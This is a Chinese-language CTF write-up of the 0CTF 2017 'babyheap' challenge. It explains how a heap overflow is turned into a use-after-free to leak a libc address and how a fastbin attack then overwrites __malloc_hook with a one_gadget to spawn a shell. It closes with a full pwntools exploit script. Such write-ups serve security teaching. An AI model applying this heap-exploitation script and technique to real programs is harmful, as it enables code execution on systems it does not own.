---
title: 0ctf2017-babyheap
authorId: hac425
tags:
  - fastbin attack
  - uaf
  - ''
categories:
  - ctf
date: 2017-12-18 19:46:00
---
### 前言

又是一道令人怀疑人生的 `baby` 题。

这道题利用思路非常巧妙,通过 `堆溢出` 和 `fastbin` 的机制构造了 `information leak`, 然后通过 `fastbin attack` 可以读写 `malloc_hook` , 然后使用 `one_gadget` 来 `getshell`.

题目和 idb 文件：https://gitee.com/hac425/blog_data/tree/master/babyheap


### 正文


程序涉及的结构体 `info` 的结构如下，可以通过 `allocate` 功能逆出来
![paste image](http://oy9h5q2k4.bkt.clouddn.com/151359802954748asgou8.png?imageslim)


程序首先 `mmap` 了一个 随机的地址，用于存放 `info table`（就是存储`info`的数组）.
![paste image](http://oy9h5q2k4.bkt.clouddn.com/151359791301977g5486x.png?imageslim)

程序的漏洞在于，在 `allocate` 时程序根据我们的输入 分配 `size` （size < 0x1000）大小的块。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513598177039adb3rvos.png?imageslim)

然而 在 `fill` 我们可以写入任意大小的数据

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513600309457yh3juekn.png?imageslim)

经典的堆溢出。

问题在于，程序保护全开，而且 `info table`  的地址还是随机的，而且分配内存时，用的时 `calloc` 会把内存初始化为0。 所以常用的 `大chunk包含小chunk` 的信息泄露方式没法使用。

这里通过将 `堆溢出` 转换为  `uaf` 来进行信息泄露。


首先分配 多个 `chunk`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15136011014075wn0qsjc.png?imageslim)

然后释放 偏移为 `1,3`的块，它们会进入 `fastbin`,然后通过部分溢出`chunk 2` 使得下面那个 `fastbin` 的 `fd` 指向下面那个大的块，然后溢出 `chunk 4` 修改其大小为 `0x21` 来 `bypass` 掉 `fastbin` 分配的 `check`

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513601149909iwlr22xb.png?imageslim)

然后分配两次我们就能再次拿到这个 大的 `chunk`, 代码如下

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1513601356365qsp2ooav.png?imageslim)
因为此时我们还没有得到任何 地址，不过各个 `chunk` 的相对偏移应该是固定的，只要内存的分配顺序，大小没有变化，所以我们可以通过修改 `fd` 的低字节(小端字节序）就能 使 `fd` 指向我们的 `大chunk`。

此时我们在把 `大chunk`的 `size` 修复，然后 用 `free` 刚刚分配的 `info`，它就会进入 `unsorted bin` ,此时在 `chunk+0x10` 处就有了 `main_arean` 的地址 （`unsorted bin`的 指针），然后用另外一个 `info` 打印内容即可 `leak`.

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15136016779927ug8wun3.png?imageslim)

费劲千辛万苦我们终于拿到了 `libc` 的地址，对于这种全开的一般想到的就是修改 `__malloc_hook` 或者 `__free_hook`, 问题来了，怎么修改。

又是一种新的思路。我们可以在 `__malloc_hook` 附近找到合适的位置，进行 `fastbin attack`. 

```
x/4gx (long long)(&main_arena)-0x40+0xd
```

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15136019955895srgx1x3.png?imageslim)
如果以这里为一个 `chunk` ，这个 `chunk` 应该被放到 `0x70` 大小的 `fastbin` 里面。所以接下来的利用思路就是，构造一个 `0x70` 大小的 `fastbin` , 然后溢出修改 `fd` 到这个 `chunk` ,分配两次我们就能读写 `__malloc_hook`了，修改它为 `one_gadget`即可。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15136025454127tpb4ti1.png?imageslim)
还有一个小 `tips` ，之前 `uaf` 的时候还有一块 `0x110` 的 `chunk` 在 `unsorted bin`, 所以我们需要先把这块内存给分配掉，然后在 进行布局。


### 最后

`one_gadget` 一个一个试，与寄存器和内存数据的状态有关。利用 `main_arean` 的数据进行 `fastbin attack` 这个 思路强悍。



**参考**

http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html

**exp**

```
from pwn import *
from time import sleep

# x/4gx (long long)(&main_arena)-0x40+0xd

def allocate(size):
	p.recvuntil("Command:")
	p.sendline("1")
	p.recvuntil("Size:")
	p.sendline(str(size))
	sleep(0.1)



def fill(index, content):
	p.recvuntil("Command:")
	p.sendline("2")
	p.recvuntil("Index:")
	p.sendline(str(index))
	p.recvuntil("Size:")
	p.sendline(str(len(content)))
	p.recvuntil("Content:")
	p.send(content)
	sleep(0.1)


def free(index):
	p.recvuntil("Command:")
	p.sendline("3")
	p.recvuntil("Index:")
	p.sendline(str(index))
	sleep(0.1)


def dump(index):
	p.recvuntil("Command:")
	p.sendline("4")
	p.recvuntil("Index:")
	p.sendline(str(index))
	p.recvuntil("Content: \n")



p = process("./0ctfbabyheap")


gdb.attach(p,'''

c

	''')

pause()
allocate(0x10)  # 0
allocate(0x10)	# 1
allocate(0x10)	# 2
allocate(0x10)	# 3
allocate(0x10)	# 4
allocate(0x100)	# 5
allocate(0x10)  # 6
allocate(0x10)  # 7

log.info("allocat some chunk, large in chunk 5")
pause()

free(1)
free(3)

log.info("free 1, 3")
#pause()

payload = "A" *0x10
payload += p64(0)
payload += p64(0x0000000000000021)
payload += "\xa0"
fill(2, payload)
log.info("modify chunk 3 's fastbin ptr, to 0xa0")
#pause()


payload = "A" *0x10
payload += p64(0)
payload += p64(0x0000000000000021)
fill(4, payload)

log.info("modify chunk 5 's size to 0x21 for bypass check")
#pause()

allocate(0x10)  # 1
allocate(0x10)  # 3, get large bin

log.info("now allocate 2 chunk to get the large bin")
#pause()

payload = "A" *0x10
payload += p64(0)
payload += p64(0x00000000000000111)
fill(4, payload)

log.info("resume large chunk size")
#pause()


free(3)
log.info("free the large bin, and our chunk 5 in unsorted bin")
#pause()

dump(5)

addr = u64(p.recv(8))
libc = addr - 0x3c4b78
one_gadget = libc + 0x4526a
log.info("libc: " + hex(libc))
log.info("one_gadget: " + hex(one_gadget))
#pause()


allocate(0x100) # 3

allocate(0x60) # 8
free(8)
payload = "A" *0x10
payload += p64(0)
payload += p64(0x0000000000000071)
payload += p64(libc + 0x3c4aed)   # fake fastbin 0x70 size
fill(7, payload)
log.info("fake fastbin")
#pause()

allocate(0x60) # 8
allocate(0x60) # 9

log.info("now chunk 9 on " + hex(libc + 0x3c4aed))

payload = "A" * 19
payload += p64(one_gadget)  # modify malloc hook
fill(9, payload)

allocate(0x10)

p.interactive()

```